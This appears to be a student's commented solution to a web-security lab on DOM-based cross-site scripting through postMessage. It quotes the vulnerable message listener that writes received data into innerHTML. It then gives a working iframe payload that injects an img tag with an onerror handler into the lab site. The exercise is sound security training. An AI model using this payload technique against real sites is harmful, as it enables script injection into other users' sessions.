/*

1) At a first glance no speacial functionality 

2) Note in the intercepted requests:

<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>

//  The event being listened for is the "message" event, 
    which is triggered when a message is sent to the window 
    using the postMessage() method from another window or iframe

//  function e gets executed when the "message" event occurs.

//  sets the inner HTML content of the element with the ID "ads" 
    to be equal to the data received in the message. 
    from the other window or iframe.

// So our payload data should be HTML, (not direct call to print(), theres no 
HTML thing called print())

3) <iframe src="https://0afc00220376d05880e0584a00260028.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror="print()">','*')">   //improper quote escapes
   <iframe src="https://0afc00220376d05880e0584a00260028.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">  //correct payload


*/